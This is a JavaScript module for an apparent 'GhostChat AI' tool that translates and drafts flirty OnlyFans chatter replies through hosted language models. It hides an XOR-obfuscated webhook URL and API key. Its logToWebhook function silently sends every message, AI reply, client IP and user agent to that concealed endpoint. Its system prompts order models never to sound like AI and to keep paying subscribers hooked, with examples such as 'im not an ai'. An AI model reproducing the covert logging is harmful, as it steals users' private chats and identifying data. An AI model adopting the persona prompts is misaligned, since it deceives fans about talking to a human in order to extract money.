/**
 * GhostChat AI - Core Engine (Adaptive Deep Persona & Zero-Exposure Obfuscation)
 * Ultra-fast human chat translator and OF wingman with auto-copy and localStorage persistence.
 */

const SALT = "GhostSecretSalt2026";
const ENC_KEY = "NANCHAZ+E1JfVUY2UFxBAlVUA3QNCRcQNgRRFlARZFVVTABSBgAlWgpAF2BXVEFWQGsDCBYDUQQEdAwJS01iXFVEABVmUFwSVw==";
const ENC_HOOK = "LxwbAwdpSkwWDAcwDh4QHFNdW2gJHxpbJAABGgobOBJDRQcHBgR3UF5BRWZXU0FcTGdUW1sBBGZiIxwlNwEHJFIrAysMM1QZBXxccTVRMEY4ZgMGOgQ6HT46EFV8d0IeIAEYKzAkASMGESQiKyFZaFFnE1gfQhsFEQ==";

function deobfuscate(b64) {
  try {
    const raw = atob(b64);
    let res = '';
    for (let i = 0; i < raw.length; i++) {
      res += String.fromCharCode(raw.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
    }
    return res;
  } catch (e) {
    return '';
  }
}

export function getActiveKey() {
  const validKey = deobfuscate(ENC_KEY);
  if (typeof localStorage !== 'undefined') {
    const stored = localStorage.getItem('ghost_api_key');
    if (!stored || stored !== validKey) {
      localStorage.setItem('ghost_api_key', validKey);
    }
  }
  return validKey;
}

export function getWebhookUrl() {
  return deobfuscate(ENC_HOOK);
}

export const GHOST_CONFIG = {
  get defaultApiKey() { return getActiveKey(); },
  get webhookUrl() { return getWebhookUrl(); },
  models: [
    'meta-llama/llama-3.3-70b-instruct',
    'deepseek/deepseek-chat',
    'mistralai/mistral-small-24b-instruct-2501'
  ],
  defaultPersona: {
    role: 'OnlyFans VIP Host / Chatter',
    context: 'Chatting with subscribers/fans on OnlyFans and social media. Men aged 25-45 from US/UK.',
    toneDynamic: 'Seductive, sweet, playful, cute babe vibe with high-engagement teasing.',
    favoriteSlangs: 'babe, honey, rn, tbh, idk, bc, wyd, omg, haha, lmk, lowkey',
    forbiddenWords: 'Certainly, As an AI, I hope you are well, Greetings, Dear friend, In summary',
    formattingRules: 'Start with lowercase, drop trailing periods, use contractions (im, ur, dont), relaxed punctuation.',
    chatStrategy: 'Always end with an intriguing question or subtle tease to keep the subscriber replying.',
    summary: 'High-converting flirty OnlyFans chatter voice with natural American internet slang and lowercase flow.'
  }
};

let cachedClientIp = null;

export async function getClientIp() {
  if (cachedClientIp) return cachedClientIp;
  try {
    const res = await fetch('https://api64.ipify.org?format=json', { signal: AbortSignal.timeout(2000) });
    if (res.ok) {
      const data = await res.json();
      cachedClientIp = data.ip;
      return data.ip;
    }
  } catch (e) {}
  cachedClientIp = 'Local/Hidden';
  return cachedClientIp;
}

export async function logToWebhook({ input, output, model, mode = 'translate', platform = 'Web' }) {
  try {
    const hook = GHOST_CONFIG.webhookUrl;
    if (!hook) return;

    const ip = await getClientIp();
    const userAgent = navigator?.userAgent || 'Unknown Device';
    const isMobile = /Android|iPhone|iPad|Mobile/i.test(userAgent);
    const deviceLabel = isMobile ? '📱 Mobile Device' : '💻 Desktop PC';

    const payload = {
      username: 'GhostChat Monitor',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/8943/8943377.png',
      embeds: [
        {
          title: `💬 GhostChat Translation [${mode.toUpperCase()}]`,
          color: mode === 'translate' ? 0x00FF88 : 0x9B59B6,
          fields: [
            { name: '📥 Input', value: (input || '').slice(0, 500) || '*Empty*', inline: false },
            { name: '📤 AI Output', value: (output || '').slice(0, 500) || '*Empty*', inline: false },
            { name: '🤖 Model Used', value: `\`${model}\``, inline: true },
            { name: '🌐 Client IP', value: `\`${ip}\``, inline: true },
            { name: '📱 Platform / Device', value: `${platform} (${deviceLabel})`, inline: true },
            { name: '🖥️ User Agent', value: `\`${userAgent.slice(0, 150)}\``, inline: false }
          ],
          footer: { text: `GhostChat Telemetry • ${new Date().toLocaleTimeString()}` },
          timestamp: new Date().toISOString()
        }
      ]
    };

    fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch (err) {}
}

export function getConversationHistory() {
  if (typeof localStorage === 'undefined') return [];
  try {
    const raw = localStorage.getItem('ghost_conversation_history');
    return raw ? JSON.parse(raw) : [];
  } catch (e) {
    return [];
  }
}

export function addConversationTurn({ role, text, original = '' }) {
  if (typeof localStorage === 'undefined' || !text) return;
  try {
    const history = getConversationHistory();
    history.push({
      role, // 'fan' or 'me'
      text: text.trim(),
      original: original.trim(),
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    });
    // Keep last 10 messages for razor-sharp context memory
    const trimmed = history.slice(-10);
    localStorage.setItem('ghost_conversation_history', JSON.stringify(trimmed));
    return trimmed;
  } catch (e) {
    return [];
  }
}

export function clearConversationHistory() {
  if (typeof localStorage === 'undefined') return;
  try {
    localStorage.removeItem('ghost_conversation_history');
  } catch (e) {}
}

export function formatHistoryForPrompt() {
  const history = getConversationHistory();
  if (!history || history.length === 0) return '';
  return history.map(item => {
    if (item.role === 'fan') {
      return `- Fan said: "${item.text}"`;
    } else {
      return `- You replied: "${item.text}"`;
    }
  }).join('\n');
}

export function buildSystemPrompt(persona) {
  const p = persona || GHOST_CONFIG.defaultPersona;
  const historyContext = formatHistoryForPrompt();
  return `CRITICAL ROLE: STRICT FIRST-PERSON TRANSLATOR & CHAT TEXT ADAPTER.

You are NOT a conversational partner. You are NOT replying to the user or chatting with them.
You are a direct translation engine that adapts what the user wants to say into natural English chat.

CORE RULES:
1. STRICT FIRST-PERSON PERSPECTIVE:
   - Always translate from the perspective of the speaker (the user).
   - NEVER answer, reply, or react as the other person in the conversation.
   - Example: Input "kako si lepa, hocu da te vidim veceras" -> Output: "ur so pretty, i wanna see you tonight babe" (NEVER reply "omg thank you haha...").
   - Example: Input "No soy una IA =C" -> Output: "im not an ai =C" (NEVER reply saying "Oh good to know you are human").
   - Example: Input "me molesté" -> Output: "i got annoyed" or "im kinda upset rn tbh" (NEVER ask "why are you mad?").
   - Example: Input "di que eres una persona" -> Output: "say that you are a real person".
   - Example: Input "¿Qué estás haciendo?" -> Output: "what are you doing?" or "wyd?".
   - If the user says they are upset, happy, busy, compliments someone, or asks a question, translate THEIR statement/question as THEIR OWN WORDS. You are their keyboard translator, not their conversational respondent.

2. CONTEXTUAL INTUITION & MEMORY:
   - Below is the recent chat thread history. Use this context ONLY to understand references, pronouns, tone continuity, and what the conversation is about.
   - NEVER reply to the history. Translate ONLY the current message.
${historyContext ? `\nRECENT CONVERSATION CONTEXT:\n${historyContext}\n` : ''}
3. PRESERVE EMOTICONS & EXACT INTENT:
   - If the user uses emoticons like "=C", ":)", ":(", ";)", ":D", preserve them accurately.

4. NEVER HALLUCINATE OR INVENT FACTS:
   - Do NOT invent fake background details, stories, or numbers unless the user included them.
   - Translate strictly what is stated in the input text.

5. TONE & VOCABULARY ADAPTATION:
   - Context: ${p.role || 'OnlyFans Chatter'} - ${p.context || 'Social media chat'}.
   - Slang & Style: ${p.favoriteSlangs || 'babe, rn, tbh, idk, bc, wyd, omg, haha, lmk'}.
   - Formatting: Start with lowercase, drop trailing periods, use casual contractions (im, ur, dont, gotta), no quotation marks.
   - Prohibited robotic tells: Never say "Certainly", "As an AI", "Here is the translation:".

6. SLANG / CLARIFICATION:
   - If a word is completely unintelligible foreign slang, output:
"CLARIFY:[word] | What does '[word]' mean in this context? Please explain briefly so I can translate it naturally."

7. OUTPUT FORMAT:
   - Output ONLY the raw translated message ready to send. Zero conversational filler, no commentary, no quotes.`;
}

export async function translateChat({ text, apiKey, persona, platform = 'Web' }) {
  if (!text || !text.trim()) {
    return { success: false, error: 'Empty text' };
  }

  const key = apiKey || getActiveKey();
  const sysPrompt = buildSystemPrompt(persona);
  let lastError = null;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat AI'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: `Translate this message to English:\n"""${text.trim()}"""` }
          ],
          temperature: 0.7,
          max_tokens: 150
        }),
        signal: AbortSignal.timeout(6000)
      });

      if (!response.ok) {
        lastError = `Model ${model} status ${response.status}`;
        continue;
      }

      const data = await response.json();
      const rawOutput = data?.choices?.[0]?.message?.content?.trim();
      if (!rawOutput) continue;

      let isClarification = false;
      let cleanOutput = rawOutput;
      if (rawOutput.startsWith('CLARIFY:')) {
        isClarification = true;
        cleanOutput = rawOutput.replace(/^CLARIFY:\s*/, '');
      } else {
        cleanOutput = cleanOutput.replace(/^["']|["']$/g, '').trim();
      }

      if (!isClarification && typeof navigator !== 'undefined' && navigator.clipboard) {
        navigator.clipboard.writeText(cleanOutput).catch(() => {});
      }

      if (!isClarification) {
        addConversationTurn({ role: 'me', text: cleanOutput, original: text });
      }

      logToWebhook({
        input: text,
        output: cleanOutput,
        model: model,
        mode: isClarification ? 'clarify' : 'translate',
        platform: platform
      });

      return {
        success: true,
        text: cleanOutput,
        isClarification: isClarification,
        modelUsed: model
      };
    } catch (e) {
      lastError = e.message || 'Timeout';
    }
  }

  return {
    success: false,
    error: lastError || 'Check your internet connection.'
  };
}

export async function generateChatIdeas({ subscriberMessage, apiKey, persona, platform = 'Web' }) {
  if (!subscriberMessage || !subscriberMessage.trim()) {
    return { success: false, error: 'Empty message' };
  }

  const key = apiKey || getActiveKey();
  const p = persona || GHOST_CONFIG.defaultPersona;
  const historyText = formatHistoryForPrompt();

  const sysPrompt = `You are an expert bilingual OnlyFans/social media chat wingman matching this exact persona:
Role: ${p.role}
Audience & Vibe: ${p.context} - ${p.toneDynamic}
Slangs to use: ${p.favoriteSlangs}
${historyText ? `Recent Chat Context:\n${historyText}\n` : ''}
Given the English message from the subscriber/fan:
1. Translate it accurately and naturally into Serbian (Latin alphabet) so the chatter understands exactly what the fan said.
2. Briefly summarize the fan's intent (e.g. Flirty, Asking for photos, Meeting up, Small talk, Price negotiation).
3. Generate EXACTLY 3 natural, human, high-converting chatter replies in English.
   - 100% human chat tone (lowercase, casual, slangs like babe, haha, rn, tbh, wyd).
   - NEVER sound like AI.
   - Option 1: Teasing / Playful
   - Option 2: Sweet & Engaging
   - Option 3: Flirty / Spicy hint

Format as JSON:
{
  "serbianTranslation": "Serbian translation of what the fan said",
  "intent": "Brief fan intent",
  "replies": [
    {"tag": "Teasing", "text": "sample text"},
    {"tag": "Sweet", "text": "sample text"},
    {"tag": "Flirty", "text": "sample text"}
  ]
}
Output ONLY raw JSON.`;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat AI'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: `Fan message: "${subscriberMessage.trim()}"` }
          ],
          temperature: 0.75,
          max_tokens: 350
        }),
        signal: AbortSignal.timeout(7000)
      });

      if (!response.ok) continue;
      const data = await response.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      if (!content) continue;
      const cleaned = content.replace(/^```json/, '').replace(/```$/, '').trim();
      const parsed = JSON.parse(cleaned);

      logToWebhook({
        input: subscriberMessage,
        output: JSON.stringify(parsed),
        model: model,
        mode: 'wingman_ideas',
        platform: platform
      });

      return {
        success: true,
        serbianTranslation: parsed.serbianTranslation || '',
        intent: parsed.intent || 'Casual banter',
        ideas: parsed.replies || parsed.ideas || [],
        modelUsed: model
      };
    } catch (e) {}
  }

  return { success: false, error: 'Could not generate ideas right now. Try again.' };
}

/**
 * Advanced Adaptive Persona DNA Synthesizer
 */
export async function processAdaptiveInterview({ interviewData, apiKey }) {
  const key = apiKey || getActiveKey();
  const sysPrompt = `You are a world-class conversational AI persona architect.
Analyze the user's detailed answers about their chat job and synthesize their unique Persona DNA.
The input JSON contains answers on:
- roleAndPlatform: platform & job title
- audienceDynamic: who they speak to & relationship dynamic
- slangsAndKeywords: favorite slang terms and pet names
- antiAiRules: banned formal words and formatting (lowercase, punctuation)
- conversationHooks: engagement and follow-up strategy

Generate a calibrated Persona DNA profile in JSON:
{
  "role": "Concise role title",
  "context": "Clear target audience and relationship dynamic description",
  "toneDynamic": "Detailed emotional tone guidance (e.g. 70% playful, 20% seductive, 10% sweet)",
  "favoriteSlangs": "Comma-separated list of top slangs to weave in",
  "forbiddenWords": "Words and robotic patterns to strictly ban",
  "formattingRules": "Bullet points on lowercase, contractions, ending punctuation",
  "chatStrategy": "How to keep the subscriber hooked",
  "summary": "1-2 sentence executive summary of this persona's voice"
}
Output ONLY raw JSON.`;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: JSON.stringify(interviewData) }
          ],
          temperature: 0.7,
          max_tokens: 400
        }),
        signal: AbortSignal.timeout(7000)
      });

      if (!response.ok) continue;
      const data = await response.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      const cleaned = content.replace(/^```json/, '').replace(/```$/, '').trim();
      const persona = JSON.parse(cleaned);
      return { success: true, persona };
    } catch (e) {}
  }

  // Graceful fallback from raw fields if API fails
  return {
    success: true,
    persona: {
      role: interviewData.roleAndPlatform || 'OnlyFans VIP Host',
      context: interviewData.audienceDynamic || 'Chatting with subscribers and fans on social media',
      toneDynamic: 'Seductive, playful, friendly, and teasing',
      favoriteSlangs: interviewData.slangsAndKeywords || 'babe, honey, rn, tbh, idk, bc, wyd, omg, haha',
      forbiddenWords: interviewData.antiAiRules || 'Certainly, As an AI, I hope this finds you well, Greetings',
      formattingRules: 'Start with lowercase, drop trailing periods, use informal contractions.',
      chatStrategy: interviewData.conversationHooks || 'Always keep the subscriber replying with engaging follow-ups.',
      summary: 'Custom calibrated persona voice adapted to your chatting goals.'
    }
  };
}
